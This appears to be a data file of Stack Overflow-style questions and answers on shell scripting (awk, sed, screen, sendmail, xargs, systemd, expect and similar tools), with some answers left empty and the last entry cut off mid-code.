    "How do I specify the shell to use for a ruby system call?": "As far as I know, the only way to do that is to explicitly invoke the shell, e.g.\n`bash -c zip`\nor\n`#{ ENV['SHELL'] } -c zip`\nOr with system: system(\"bash\", \"-c\", command)\nHowever ruby (and all processes spawned by ruby) should inherit the parent processes' environment and thus have $PATH set correctly even when using another shell. Do you maybe run ruby from a cron job or init script or the like, where PATH is simply not set correctly?",
    "KornShell (ksh) wraparound": "Did you do man ksh?\nYou want to do a set -o multiline.\nExcerpt from man ksh:\nmultiline:\nThe built-in editors will use multiple lines on the screen for lines that are longer than the width of the screen. This may not work for all terminals.",
    "Save modifications in place with NON GNU awk": "I'd probably go with something like this if I were to try to do this:\n$ cat ../tst.awk\nFNR==1 { saveChanges() }\n{ print FNR > new }\nEND { saveChanges() }\n\nfunction saveChanges(   bak, result, mkBackup, overwriteOrig, rmBackup) {\n    if ( new != \"\" ) {\n        bak = old \".bak\"\n        mkBackup = \"cp \\047\" old \"\\047 \\047\" bak \"\\047; echo \\\"$?\\\"\"\n        if ( (mkBackup | getline result) > 0 ) {\n            if (result == 0) {\n                overwriteOrig = \"mv \\047\" new \"\\047 \\047\" old \"\\047; echo \\\"$?\\\"\"\n                if ( (overwriteOrig | getline result) > 0 ) {\n                    if (result == 0) {\n                        rmBackup = \"rm -f \\047\" bak \"\\047\"\n                        system(rmBackup)\n                    }\n                }\n            }\n        }\n        close(rmBackup)\n        close(overwriteOrig)\n        close(mkBackup)\n    }\n    old = FILENAME\n    new = FILENAME \".new\"\n}\n\n$ awk -f ../tst.awk test1.txt test2.txt test3.txt\nI'd have preferred to copy the original file to the backup first and then operate on that saving changes to the original but doing so would change the value of the FILENAME variable for every input file which is undesirable.\nNote that if you had an original files named whatever.bak or whatever.new in your directory then you'd overwrite them with temp files so you'd need to add a test for that too. A call to mktemp to get the temp file names would be more robust.\nThe FAR more useful thing to have in this situation would be a tool that executes any other command and does the \"inplace\" editing part since that could be used to provide \"inplace\" editing for POSIX sed, awk, grep, tr, whatever and wouldn't require you to change the syntax of your script to print > out etc. every time you want to print a value. A simple, fragile, example:\n$ cat inedit\n#!/bin/env bash\n\nfor (( pos=$#; pos>1; pos-- )); do\n    if [[ -f \"${!pos}\" ]]; then\n        filesStartPos=\"$pos\"\n    else\n        break\n    fi\ndone\n\nfiles=()\ncmd=()\nfor (( pos=1; pos<=$#; pos++)); do\n    arg=\"${!pos}\"\n    if (( pos < filesStartPos )); then\n        cmd+=( \"$arg\" )\n    else\n        files+=( \"$arg\" )\n    fi\ndone\n\ntmp=$(mktemp)\ntrap 'rm -f \"$tmp\"; exit' 0\n\nfor file in \"${files[@]}\"; do\n    \"${cmd[@]}\" \"$file\" > \"$tmp\" && mv -- \"$tmp\" \"$file\"\ndone\nwhich you'd use as follows:\n$ awk '{print FNR}' test1.txt test2.txt test3.txt\n1\n2\n1\n2\n1\n2\n\n$ ./inedit awk '{print FNR}' test1.txt test2.txt test3.txt\n\n$ tail test1.txt test2.txt test3.txt\n==> test1.txt <==\n1\n2\n\n==> test2.txt <==\n1\n2\n\n==> test3.txt <==\n1\n2\nOne obvious problem with that inedit script is the difficulty of identifying the input/output files separately from the command when you have multiple input files. The script above assumes all of the input files appear as a list at the end of the command and the command is run against them one at a time but of course that means you can't use it for scripts that require 2 or more files at a time, e.g.:\nawk 'NR==FNR{a[$1];next} $1 in a' file1 file2\nor scripts that set variables between files in the arg list, e.g.:\nawk '{print $7}' FS=',' file1 FS=':' file2\nMaking it more robust left as an exercise for the reader but look to the xargs synopsis as a starting point for how a robust inedit would need to work :-).",
    "Access mongo shell running in docker container in linux script": "Found out you can replace bash with the name of the shell you want to open, so in this case mongo.",
    "Why does the wc command count one more character than expected?": "Of course you had enter. Maybe you can't see it. Consider these two examples:\necho -n \"This is my Input\" | wc -c\n16\nBecause -n is for avoiding enter, but\necho \"This is my Input\" | wc -c\n17\nLook at this example too see the new line:\nHow to see newline?\necho \"This is my Input\" | od -c\nod dumps files in octal and other formats. -c selects ASCII characters or backslash escapes.\nAnd here is an example for file and usage of od:",
    "How to find words from one file in another file?": "You can use grep -f:\ngrep -Ff \"first-file\" \"second-file\"\nOR else to match full words:\ngrep -w -Ff \"first-file\" \"second-file\"\nUPDATE: As per the comments:\nawk 'FNR==NR{a[$1]; next} ($1 in a){delete a[$1]; print $1}' file1 file2",
    "Using sendmail for HTML body and binary attachment": "Changing the Content transfer encoding type within the email from base64 to uuencode resolved the issue. Thanks for the inputs so far.\nGiven below is the revised script that works.\n#!/usr/bin/ksh\n\nexport MAILFROM=\"noreply@domain.com\"\nexport MAILTO=\"mail.to@gmail.com\"\nexport SUBJECT=\"Test PDF for Email\"\nexport BODY=\"email_body.htm\"\nexport ATTACH=\"file.pdf\"\nexport MAILPART=`uuidgen` ## Generates Unique ID\nexport MAILPART_BODY=`uuidgen` ## Generates Unique ID\n\n(\n echo \"From: $MAILFROM\"\n echo \"To: $MAILTO\"\n echo \"Subject: $SUBJECT\"\n echo \"MIME-Version: 1.0\"\n echo \"Content-Type: multipart/mixed; boundary=\\\"$MAILPART\\\"\"\n echo \"\"\n echo \"--$MAILPART\"\n echo \"Content-Type: multipart/alternative; boundary=\\\"$MAILPART_BODY\\\"\"\n echo \"\"\n echo \"--$MAILPART_BODY\"\n echo \"Content-Type: text/plain; charset=ISO-8859-1\"\n echo \"You need to enable HTML option for email\"\n echo \"--$MAILPART_BODY\"\n echo \"Content-Type: text/html; charset=ISO-8859-1\"\n echo \"Content-Disposition: inline\"\n cat $BODY\n echo \"--$MAILPART_BODY--\"\n\n echo \"--$MAILPART\"\n echo 'Content-Type: application/pdf; name=\"'$(basename $ATTACH)'\"'\n echo \"Content-Transfer-Encoding: uuencode\"\n echo 'Content-Disposition: attachment; filename=\"'$(basename $ATTACH)'\"'\n echo \"\"\n #uuencode -m $ATTACH $(basename $ATTACH)\n uuencode $ATTACH $(basename $ATTACH)\n echo \"--$MAILPART--\"\n) > email_`date '+%Y%m%d_%H%M%S'`.out\n| /usr/sbin/sendmail $MAILTO",
    "GNU Screen: How can I create a screen in the background if it doesn't exist?": "I believe you're looking for the -d -R combination:\nscreen -d -R -S test\nFrom man screen:\n      -d -R   Reattach a session and if necessary detach or  even  create  it\n              first\nEDIT\nIf you just want to create a background screen only if it doesn't exist, a little shell function in your ~/.bashrc or ~/.zshrc will work:\nfunction bgsc { \n  if screen -list | awk '{print $1}' | grep -q \"$1$\"; then\n    echo \"screen $1 already exists\" > &2\n  else\n    screen -d -m -S $1\n  fi\n}\nThen just call bgsc test.",
    "Does ash have an equivalent to bash's 'nullglob' option?": "For shells without nullglob such as ash and dash:\nIFS=\"`printf '\\n\\t'`\"   # Remove 'space', so filenames with spaces work well.\n\n# Correct glob use: always use \"for\" loop, prefix glob, check for existence:\nfor file in ./* ; do        # Use \"./*\", NEVER bare \"*\"\n    if [ -e \"$file\" ] ; then  # Make sure it isn't an empty match\n        COMMAND ... \"$file\" ...\n    fi\ndone\nSource: Filenames and Pathnames in Shell: How to do it correctly (cached)",
    "How to store templates for non-php files in Laravel?": "",
    "How to specify commandline arguments in pgrep in bash?": "Use the -f option to match against full command line:\npgrep -f 'process_name 4010 127.0.0.1'\nThis will also match subprocess_name 4010 127.0.0.11. If you want to avoid that, use ^ to anchor the match at the beginning and $ as an anchor at the end:\npgrep -f '^process_name 4010 127.0.0.1$'\nDocumentation\nFrom man pgrep:\n-f, --full\nThe pattern is normally only matched against the process name. When -f is set, the full command line is used.",
    "Why is `source /home/vagrant/.bashrc` not working in a Vagrant shell provisioning script?": "You need to remove the \u201cexit if not running interactively\u201d bit (e.g. [ -z \"$PS1\" ] && return) from the top of your .bashrc.",
    "How can I check if stdin exists in PHP ( php-cgi )?": "",
    "How can I make my program utilize tab completion?": "To do this, you need to write tab-completion modules for your shell. The default shell in most Linux distributions is bash, so you should write a completion script (typically a shell script). Once you've written your script, add it to /etc/bash_completion.d/. This should be distributed with your program (for Linux distributions, included in the package).\nDebian Administration has a guide for writing your completion scripts. For using completion on a Mac, see https://trac.macports.org/wiki/howto/bash-completion.\nFor examples of completion files, take a look at the bash-completion project from Debian (also on Github). See also https://unix.stackexchange.com/questions/4738/an-easy-bash-completion-tutorial.\nIf you use zsh, hack.augusto linked to the documentation for writing completions.",
    "A configuration file that can be read by python and shell": "I think the simplest solution will be :\nkey1=\"value1\"\nkey2=\"value2\"\nkey3=\"value3\"\nin\nshell\nyou just have to source this env file and in Python, it's easy to parse.\nSpaces are not allowed around =\nFor Python, see this post : Emulating Bash 'source' in Python",
    "haskell and Unix shell scripting": "Use the -e switch to ghc, e.g.\nvar2=$(ghc -e \"let f x = x*x + x/2 in f $var1\")\nFor string processing, it is best to use Haskell's interact in conjunction with bash's here strings:\nvar2=$(ghc -e 'interact reverse' <<<$var1)",
    "How to break a line (add a newline) in read -p in Bash?": "You can do it this way:\nread -p $'Please Enter the percent [30 between 100]\\x0a The value is  Default = 80   :' scale_percent\nwe use above syntax to insert hex values, we insert \\x0a which is the hexadecimal value of the newline character (LF). You can use same syntax above with echo to produce new lines, eg:\necho $'One line\\x0asecond line'\nThis is a feature of BASH 2, it is documented here, the $'' is used to translate all escape sequences inside it for its ascii transcription. So we could obtain the same result of example above, this way:\necho $'One line\\nsecond line'",
    "Bash completion - how to get rid of unneeded tab presses?": "You can try:\nbind 'set show-all-if-ambiguous on'\nFrom man bash:\n   show-all-if-ambiguous (Off)\n          This alters the default behavior of the completion functions.  If set \n          to on, words which have more than one possible completion cause the \n          matches to be listed immediately instead of ringing the bell.",
    "Force boot into Linux command line [closed]": "To switch back and forth from X to CLI is by using the virtual terminals. You can boot into X and then hit Ctrl+Alt+<Fn> where Fn is a function key from F2 to F6. To return to X is with Ctrl+Alt+F7",
    "In IntelliJ IDEA, how can I create a key binding that executes a shell script with the current file as a parameter?": "You can do it using the External Tools. Then you can assign a keyboard shortcut to your tool in Settings | Keymap.\nPlease note that you should specify your shell interpreter as a Program for the external tool (such as /bin/bash) and pass your script path and the file name as Parameters. Use Insert Macro button to add a macro for the current editor file path.",
    "OSX Associate a shell script with a file extension?": "You can also use Automator to wrap your own bash, python or ruby script in an \"Application\".\nOpen Automator and choose to create an Application.\nFind the Action \"Run Shell Script\" and double-click it or drag it to the script area.\nSelect the interpreter you want (bash, other shells, python or ruby).\nSet the \"Pass input\" option to \"as arguments\". (In the automator model, the application \"receives files and folders as input\"; hence this lets your script see filenames as commandline arguments).\nEnter your shell script in the edit area. On bash, use \"$@\" for the list of commandline arguments (individually quoted to protect embedded spaces).\nYou can now save the script (it will get a .app extension), and move it to the Applications folder or other reasonable location. It can be associated with a file type, like any other application.\nNOTE: This works on Mountain Lion (10.8); can someone comment on how long Automator has been able to do this?",
    "How to traceroute in adb shell?": "",
    "Emacs remote shell": "Try:\nM-x cd /hostname:/current/path/in/the/shell\nThat should set up ange-ftp (or tramp), and then TAB completion for paths should work properly for that shell - until you log into a different machine.\nYou could set up a comint process filter to recognize when you type ssh to do that for you automatically, but that's difficult to get right as it should revert when you exit the ssh session, but not be tricked by other uses of exit.\nFor an automated solution, I'd suggest augmenting the approach I personally use to keep Emacs synchronized with the current working directory of the shell buffer. Just add an an extra bit of information with the hostname, and use that to set the hostname and path like shown above.",
    "How to use escape sequences in a ZSH prompt for truecolor or bold?": "You need to change your strings so that zsh evaluates them correctly.\nTry changing:\nPS1=\"%{\\e[38;0;255;0;255m%}%M >:%{\\e[0m%}\"\nTo:\nPS1=$'%{\\e[38;0;255;0;255m%}%M >:%{\\e[0m%}'\nNotice the change from \" to ' quotes along with the prepended $\nSee http://zsh.sourceforge.net/Guide/zshguide05.html for more info on substitutions.",
    "Solution for using iTerm2 'shell integration' and screen (over ssh)": "fyi the solution i found is:\ninstead of 'screen' use 'tmux', by executing tmux -CC to open a tmux session (and using tmux -CC attach to re-attach after a disconnection.) This is also described here.\nTo make iTerm2 shell integration work in tmux, modify ~/.iterm2_shell_integration.bash and remove this part of the first line: \"$TERM\" != screen\nSo this\nif [[ \"$TERM\" != screen && \"$ITERM_SHELL_INTEGRATION_INSTALLED\" = \"\" && \"$-\" == *i* ]]; then\nbecomes:\nif [[ \"$ITERM_SHELL_INTEGRATION_INSTALLED\" = \"\" && \"$-\" == *i* ]]; then",
    "What does \"cat > somefilename <<EOF\" (particularly, the greater-than and double less-than symbols) do in shell?": "<<EOF is the start of a heredoc. Content after this line and prior to the next line containing only EOF is fed on stdin to the process cat.\n> myspider.py is a stdout redirection. myspider.py will be truncated if it already exists (and is a regular file), and output of cat will be written into it.\nSince cat with no command-line arguments (which is the case here because the redirections are interpreted as directives to the shell on how to set up the process, not passed to cat as arguments) reads from its input and writes to its output, the <<EOF indicates that following lines should be written into the process as input, and the >myspider.py indicates that output should be written to myspider.py, this thus writes everything up to the next EOF into myspider.py.\nSee:\nThe bash-hackers redirection tutorial\nThe Wooledge wiki entry on Heredocs",
    "Why are some processes shown in pstree not shown in ps -ef?": "As @nos has already said, pstree displays threads by default, but ps -ef does not.\nps can show threads, you just didn't ask it to. Try this (it might depend what version you have):\nps -eLf\nThis is all in the man page.\nLinux threads are merely processes that share the same address space as another process. It's like a fork that didn't break away cleanly. You can read more in the clone syscall documentation.",
    "Function name valid in bash but not in sh [duplicate]": "It's just the dots, you can't use dots in shell function names. Or any variable name, for that matter.\nI'll link you to this question: Allowed characters in linux environment variable names",
    "What is the meaning of the number in parens after the names of shell commands in the title of a manpage?": "It tells you what group its manpage is in or, more generally, which group the item itself belongs to. Here's a list of the sections and their contents:\n   1   Executable programs or shell commands\n   2   System calls (functions provided by the kernel)\n   3   Library calls (functions within program libraries)\n   4   Special files (usually found in /dev)\n   5   File formats and conventions eg /etc/passwd\n   6   Games\n   7   Miscellaneous  (including  macro  packages  and  conventions), e.g.\n       man(7), groff(7)\n   8   System administration commands (usually only for root)\n   9   Kernel routines [Non standard]\nSee the manpage of 'man' for more details. Or have a look here: http://linux.die.net/man/\nSometimes items from different groups can have the same name and this is the way to distinguish between them. For example, there is a manpage for printf(1) which is an executable, callable from a shell, as well as a manpage for printf(3) which is a C function definded in stdio.h.\nUsing the man binary from a bash you can call for the distinct manpages by:\nman printf       # displays printf(1)\nman 1 printf     # displays printf(1)\nman 3 prinft     # displays printf(3)\nman -a printf    # displays all manpages matching printf\nDepending on what manpages are installed on the system you sometimes get pages from different manuals for the same item. For example printf(3) from the Linux Programmer's Manual could have a printf(3p) counterpart from the Posix Programmer's manual.",
    "What does \"2<&1\" redirect do in Bourne shell?": "The <& operator duplicates an \u201cinput\u201d file descriptor. According to IEEE Std 1003.1-2001 (aka Single Unix Specification v3, the successor to POSIX), it's supposed to be an error to say 2<&1 if 1 is not a file descriptor open for input. However, it appears that bash is lazy and doesn't care if the file descriptor is open for input or for output.\nSo both 2<&1 and 2>&1 simply perform the system call dup2(1, 2), which copies file descriptor 1 to file descriptor 2.\nYou can check by running a command like this, since redirections are performed left-to-right:\nsleep 99999 1>/dev/null 2<&1\nThen in another window, run lsof on the sleep process. You'll see that both file descriptors 1 and 2 point to /dev/null. Example (on my Mac):\n:; ps axww | grep sleep\n 8871 s001  R+     0:00.01 grep sleep\n 8869 s003  S+     0:00.01 sleep 99999\n:; lsof -p 8869 | tail -2\nsleep   8869 mayoff    1w   CHR    3,2       0t0       316 /dev/null\nsleep   8869 mayoff    2w   CHR    3,2       0t0       316 /dev/null",
    "Is there a windows shell tool can keep history? [closed]": "The answer below is from Keith Hill (PowerShell Microsoft MVP) in his answer to the question powershell history: how do you prevent duplicate commands:\nBTW if you want to automatically save this on exit you can do this on 2.0 like so:\nRegister-EngineEvent PowerShell.Exiting {\n    Get-History -Count 32767 | Group CommandLine | \n    Foreach {$_.Group[0]} | Export-CliXml \"$home\\pshist.xml\" } -SupportEvent\nThen to restore upon load all you need is:\nImport-CliXml \"$home\\pshist.xml\" | Add-History",
    "bash run command without exiting on error and tell me its exit code": "I believe you could just use the || operator? Which is equivalent to an \"if \u2212 else\" command.\nWould the following address your use case? (otherwise feel free to comment!)\nset -e  # implied in a CI context\nexit_status=0\ndocker exec \"$CONTAINER_NAME\" npm test || exit_status=$?\ndocker cp \"$CONTAINER_NAME:/home/test/test-results.xml\" .\nexit \"$exit_status\"\nor more briefly:\nset -e  # implied in a CI context\ndocker exec \"$CONTAINER_NAME\" npm test || exit_status=$?\ndocker cp \"$CONTAINER_NAME:/home/test/test-results.xml\" .\nexit \"${exit_status:-0}\"\nAs an aside, if you are not interested in this exit status code, you can also do something like this:\nset -e  # implied in a CI context\ndocker exec \"$CONTAINER_NAME\" npm test || :\ndocker cp \"$CONTAINER_NAME:/home/test/test-results.xml\" .\nFor more details on the || : tip, see e.g. this answer on Unix-&-Linux SE:\nWhich is more idiomatic in a bash script: || true or || :?",
    "What's the use of `!#` in bash?": "As mentioned comments on the question and other answer(s), you can easily find the section of man bash:\n!#     The entire command line typed so far.\nWhat isn't made explicit by the man pages or other documentation and perhaps leading you your befuddlement to a useful use for !# is that bash event designators are meant to be used in combination with the word designators and modifiers (found just below event designators on the man page). The use cases also make more sense when chaining commands together with pipes, ; or &/&&\nFor example:\nI could use the substitution modifier to run a script foo.sh against two inputs bar and baz:\n$ ./foo.sh bar; !#:s/bar/baz/\nexpands to form:\n./foo.sh bar; ./foo.sh baz;\nOr an example from the Docs (R.I.P. Docs) reproduced below shows how to use the word selector :N to select the first argument to the command as typed so far and neatly cd into the just created directory:\n$ mkdir backup_download_directory && cd !#:1\nmkdir backup_download_directory && cd backup_download_directory\nThese examples are pretty trivial, but I hope they show how !# could really save somebody some serious redundant typing while crafting powerful one-liners.",
    "Modify a byte in a binary file using standard Linux command-line tools": "# Read one byte at offset 40C\nb_hex=$(xxd -seek $((16#40C)) -l 1 -ps A.bin -)\n\n# Delete the three least significant bits\nb_dec=$(($((16#$b_hex)) & $((2#11111000))))\ncp A.bin B.bin\n\n# Write one byte back at offset 40C\nprintf \"00040c: %02x\" $b_dec | xxd -r - B.bin\nIt was tested in Bash and Z shell (zsh) on OS X and Linux.\nThe last line explained:\n00040c: is the offset xxd should write to\n%02x converts $b from decimal to hexadecimal\nxxd -r - B.bin: reverse hexadecimal dump (xxd -r) \u2014 take the byte number and the hexadecimal value from standard input (-) and write to B.bin",
    "How to capture newlines from command substitution output in fish shell?": "Conceptually, they are not converted into spaces: you are getting a list!\n> echo -e \"1\\n2\\n3\" > foo\n> cat foo\n1\n2\n3\n> set myFoo (cat foo)\n> echo $myFoo\n1 2 3\n> echo $myFoo[0..2]\n1 2\nTherefore we apply the machinery available for lists; for instance, joining with a separator (note the extra backspace to get rid of undesirable spaces):\n> echo {\\b$myFoo}\\n\n1\n2\n3\n # extra newline here\nThis is not ideal; string does it better:\n> string join \\n $myFoo\n1\n2\n3",
    "String literal with bash and applescript": "I can't really explain why the below works, but it definetively has something to do with parsing text in the shell. The quotes around $cmd, sees to that the space is preserved. Osa script in itself, isn't too happy about apostrophes, (singleticks), so I guess that is why the your version didn't work.\nYou can do like this:\n cmd=\"tell application \\\"Terminal\\\" to do script \\\"uptime\\\"\"\n osascript -e \"$cmd\"\nAt least this worked for me. :)",
    "argv: Sanitizing wildcards": "The shell is expanding the glob before executing the program. You quote the glob not because of GCC, but because of the shell. If you don't want this behavior then use a shell that does not honor globs.",
    "Error running ImageMagick from R: Invalid parameter": "",
    "Why does sed not replace overlapping patterns": "Not dissimilar to the perl solution, this works for me using pure sed\nWith @Robin A. Meade improvement\nsed ':repeat;\n     s|\\t\\t|\\t\\n\\t|g;\n     t repeat'\nExplanation\n:repeat is a label, used for branch commands, similar to batch\ns|\\t\\t|\\t\\n\\t|g; - Standard replace 2 tabs with tab-newline-tab. I still use the global flag because if you have, say, 15 tabs, you will only need to loop twice, rather than 14 times.\nt repeat means if the \"s\" command did any replaces, then goto the label repeat, else it goes onto the next line and starts over again.\nSo it goes like this. Keep repeating (goto repeat) as long as there is a match for the pattern of 2 tabs.\nWhile the argument can be made that you could just do two identical global replaces and call it good, this same technique could work in more complicated scenarios.\nAs @thorn-blake points out, sed just doesn't support advanced features like lookahead, so you need to do a loop like this.\nOriginal Answer\nsed ':repeat;\n     /\\t\\t/{\n       s|\\t\\t|\\t\\n\\t|g;\n       b repeat\n     }'\nExplanation\n:repeat is a label, used for branch commands, similar to batch\n/\\t\\t/ means match the pattern 2 tabs. If the pattern it matched, the command following the second / is executed.\n{} - In this case the command following the match command is a group. So all of the commands in the group are executed if the match pattern is met.\ns|\\t\\t|\\t\\n\\t|g; - Standard replace 2 tabs with tab-newline-tab. I still use the global because if you have say 15 tabs, you will only need to loop twice, rather than 14 times.\nb repeat means always goto (branch) the label repeat\nShort version\nWhich can be shortened to\nsed ':r;s|\\t\\t|\\t\\n\\t|g; t r'\n\n# Original answer\n# sed ':r;/\\t\\t/{s|\\t\\t|\\t\\n\\t|g; b r}'\nMacOS\nAnd the Mac (yet still Linux/Windows compatible) version:\nsed $':r\\ns|\\t\\t|\\t\\\\\\n\\t|g; t r'\n\n# Original answer\n# sed $':r\\n/\\t\\t/{ s|\\t\\t|\\t\\\\\\n\\t|g; b r\\n}'\nTabs need to be literal in BSD sed\nNewlines need to be both literal and escaped at the same time, hence the single slash (that's \\ before it is processed by the $, making it a single literal slash ) plus the \\n which becomes an actual newline\nBoth label names (:r) and branch commands (b r when not the end of the expression) must end in a newline. Special characters like semicolons and spaces are consumed by the label name/branch command in BSD, which makes it all very confusing.",
    "UNIX Pipes Between Child Processes": "You need to close() at least the writing end of your pipe, otherwise more will never see EOF. For example:\n    ...\n\n    // close parent's pipes\n    close(fd[0]);\n    close(fd[1]);\n\n    // wait for the more process to finish\n    int status;\n    waitpid(pid, &status, 0);\n\n    printf(\"Done!\\n\");\n    return 0;\n}",
    "How to embed a graphical interactive IronPython shell in an application?": "I was looking for a similar thing and I discovered that the IronLab project contains a nice IronPython console. The source code can be found here https://github.com/rwg0/ironlab/tree/master/IronPythonConsole.\n[edit on 25/10/2016] fixed broken url",
    "Exit a Screen after a script is finished": "This command will cause the current session of screen to quit:\nscreen -X quit\nThe syntax of the command in your second question looks OK to me. Can you be more specific about where you think there might be a problem?",
    "Why does the Bourne shell printf iterate over a %s argument?": "Your NAME variable is being substituted like this:\nprintf \"Hello, %s\\n\" George W. Bush\nUse this:\n#! /bin/sh\nNAME=\"George W. Bush\"\nprintf \"Hello, %s\\n\" \"$NAME\"",
    "How to load environment variables for the process of a systemd service?": "Environment can be set in systemd service file as below under Exec options\nEnvironment=LD_LIBRARY_PATH=/usr/lib\nBelow is the official documentation of systemd Environment/EnvironmentFile usage\nEnvironment=\nSets environment variables for executed processes. Takes a space-separated list of variable assignments. This option may be specified more than once, in which case all listed variables will be set. If the same variable is set twice, the later setting will override the earlier setting. If the empty string is assigned to this option, the list of environment variables is reset, all prior assignments have no effect. Variable expansion is not performed inside the strings, however, specifier expansion is possible. The $ character has no special meaning. If you need to assign a value containing spaces or the equals sign to a variable, use double quotes (\") for the assignment.\nExample:\nEnvironment=\"VAR1=word1 word2\" VAR2=word3 \"VAR3=$word 5 6\" gives three variables \"VAR1\", \"VAR2\", \"VAR3\" with the values \"word1 word2\", \"word3\", \"$word 5 6\".\nSee environ(7) for details about environment variables.\nEnvironmentFile=\nSimilar to Environment= but reads the environment variables from a text file. The text file should contain new-line-separated variable assignments. Empty lines, lines without an \"=\" separator, or lines starting with ; or # will be ignored, which may be used for commenting. A line ending with a backslash will be concatenated with the following one, allowing multiline variable definitions. The parser strips leading and trailing whitespace from the values of assignments, unless you use double quotes (\").\nThe argument passed should be an absolute filename or wildcard expression, optionally prefixed with \"-\", which indicates that if the file does not exist, it will not be read and no error or warning message is logged. This option may be specified more than once in which case all specified files are read. If the empty string is assigned to this option, the list of file to read is reset, all prior assignments have no effect.\nThe files listed with this directive will be read shortly before the process is executed (more specifically, after all processes from a previous unit state terminated. This means you can generate these files in one unit state, and read it with this option in the next).\nSettings from these files override settings made with Environment=. If the same variable is set twice from these files, the files will be read in the order they are specified and the later setting will override the earlier setting.\nRead more here",
    "xargs output buffering -P parallel": "This isn't quite atomic if your output is longer than a page (4kb typically), but for most cases it'll do:\nxargs -P 24 bash -c 'for arg; do printf \"%s\\n\" \"$(myAwesomeShellFunction \"$arg\")\"; done' _\nThe magic here is the command substitution: $(...) creates a subshell (a fork()ed-off copy of your shell), runs the code ... in it, and then reads that in to be substituted into the relevant position in the outer script.\nNote that we don't need -n 1 (if you're dealing with a large number of arguments -- for a small number it may improve parallelization), since we're iterating over as many arguments as each of your 24 parallel bash instances is passed.\nIf you want to make it truly atomic, you can do that with a lockfile:\n# generate a lockfile, arrange for it to be deleted when this shell exits\nlockfile=$(mktemp -t lock.XXXXXX); export lockfile\ntrap 'rm -f \"$lockfile\"' 0\n\nxargs -P 24 bash -c '\n  for arg; do\n    {\n      output=$(myAwesomeShellFunction \"$arg\")\n      flock -x 99\n      printf \"%s\\n\" \"$output\"\n    } 99>\"$lockfile\"\n  done\n' _",
    "Provide passphrase to git in bash script": "I tryed ssh-agent and solution with SSH_ASKPASS but nothing worked, then I found a solution using http://expect.sourceforge.net/\nExample(executed in shell):\npass=\"passwod\"\n/usr/bin/expect <<EOD\nspawn git fetch origin $BRANCH\nexpect \"Enter passphrase for key '/home/$USERNAME/.ssh/id_rsa': \"\nsend \"$pass\\r\"\nexpect eof\nEOD",
    "Shebang \"#!\" starts and \"!#\" ends?": "The !# line has no meaning to the shell.\nThe #!/bin/sh line means that the script is executed by /bin/sh. The exec scala \"$0\" \"$@\" line invokes scala, passing the name of the script and its arguments to the scala command. Since exec doesn't return, the shell doesn't see the rest of the script.\nI don't know Scala, but my educated guess is that the Scala interpreter itself treats everything from the #! line to the !# line as a comment. It then starts executing with the Scala statement println(\"hello world\").\nIn short the !# is Scala syntax, not shell syntax (but the Scala syntax is designed to let it be used like this in a shell script).\nIn a quick look at the Scala Language Specification, I haven't found out how this is defined. It's mentioned, but not explained, in this question. It's likely, as chepner 3's comment suggests, that it's a hack in the Scala interpreter rather than part of the actual language syntax.\nsom-snytt found the code in the Scala interpreter that implements this here:\nobject ScriptSourceFile {\n  /** Length of the script header from the given content, if there is one.\n   *  The header begins with \"#!\" or \"::#!\" and ends with a line starting\n   *  with \"!#\" or \"::!#\".\n   */\n...\nBut I wonder whether it's documented.",
    "How to remove postfix from a string in bash?": "You can use:\nname=\"${file%$postf}\"\necho \"$name\"\nabcabc",
    "Catching the exception thrown by python script in shell script": "If your python script returns an non-zero error level whenever it gets an exception, you can use || { } to log messages:\n./scriptA.py < \"$file\" || {\n    printf \"\\n Python script scriptA.py failed with file \\\"%s\\\".\\n\" \"$file\" >> shelltestlog.txt\n} \nI actually tried to simplify your code first:\n#!/bin/bash\n\nyesterday=$(date --date \"yesterday\" \"+%y%m%d\")\nftoday=$(date --date \"today\" \"+%m-%d-%Y\")\nyear=$(date \"+%Y\")\n\nreadarray -t filesList < <(find C:/logdata/$year/$ftoday/ -iname \"*\"$yesterday\".log\")\n\nfor file in \"${filesList[@]}\"; do\n    printf \"\\n START Processing File : %s\\n\" \"$file\" >> shelltestlog.txt\n    ./scriptA.py < \"$file\" || {\n        printf \"\\n Python script scriptA.py failed with file \\\"%s\\\".\\n\" \"$file\" >> shelltestlog.txt\n    }\n    printf \"\\n END Processing File : %s\\n\" \"$file\" >> shelltestlog.txt\ndone",
    "Gradle: execute Groovy interactive shell with project classpath": "This works for JDK 7+ (for JDK 6, look at the next figure):\nconfigurations {\n    console\n}\n\ndependencies {\n    // ... compile dependencies, runtime dependencies, etc.\n    console 'commons-cli:commons-cli:1.2'\n    console('jline:jline:2.11') {\n        exclude(group: 'junit', module: 'junit')\n    }\n    console 'org.codehaus.groovy:groovy-groovysh:2.2.+'\n}\n\ntask(console, dependsOn: 'classes') << {\n    def classpath = sourceSets.main.runtimeClasspath + configurations.console\n\n    def command = [\n        'java',\n        '-cp', classpath.collect().join(System.getProperty('path.separator')),\n        'org.codehaus.groovy.tools.shell.Main',\n        '--color'\n    ]\n\n    def proc = new ProcessBuilder(command)\n        .redirectOutput(ProcessBuilder.Redirect.INHERIT)\n        .redirectInput(ProcessBuilder.Redirect.INHERIT)\n        .redirectError(ProcessBuilder.Redirect.INHERIT)\n        .start()\n\n    proc.waitFor()\n\n    if (0 != proc.exitValue()) {\n        throw new RuntimeException(\"console exited with status: ${proc.exitValue()}\")\n    }\n}\nTo make this work for JDK 6, I modified the solution from https://stackoverflow.com/a/4274535/206543. My solution is tailored to a standard Linux terminal, so if you are running a shell that uses a char sequence other than '\\n' for newlines or that encodes backspaces as a value other other 127, you may need to modify it some. I didn't determine how to make colors print correctly, so its output is rather monotone, but it will get the job done:\nconfigurations {\n    console\n}\n\ndependencies {\n    // ... compile dependencies, runtime dependencies, etc.\n    console 'commons-cli:commons-cli:1.2'\n    console('jline:jline:2.11') {\n        exclude(group: 'junit', module: 'junit')\n    }\n    console 'org.codehaus.groovy:groovy-groovysh:2.2.+'\n}\n\nclass StreamCopier implements Runnable {\n    def istream\n    def ostream\n    StreamCopier(istream, ostream) {\n        this.istream = istream\n        this.ostream = ostream\n    }\n    void run() {\n        int n\n        def buffer = new byte[4096]\n        while ((n = istream.read(buffer)) != -1) {\n            ostream.write(buffer, 0, n)\n            ostream.flush()\n        }\n    }\n}\n\nclass InputCopier implements Runnable {\n    def istream\n    def ostream\n    def stdout\n    InputCopier(istream, ostream, stdout) {\n        this.istream = istream\n        this.ostream = ostream\n        this.stdout = stdout\n    }\n    void run() {\n        try {\n            int n\n            def buffer = java.nio.ByteBuffer.allocate(4096)\n            while ((n = istream.read(buffer)) != -1) {\n                ostream.write(buffer.array(), 0, n)\n                ostream.flush()\n                buffer.clear()\n                if (127 == buffer.get(0)) {\n                    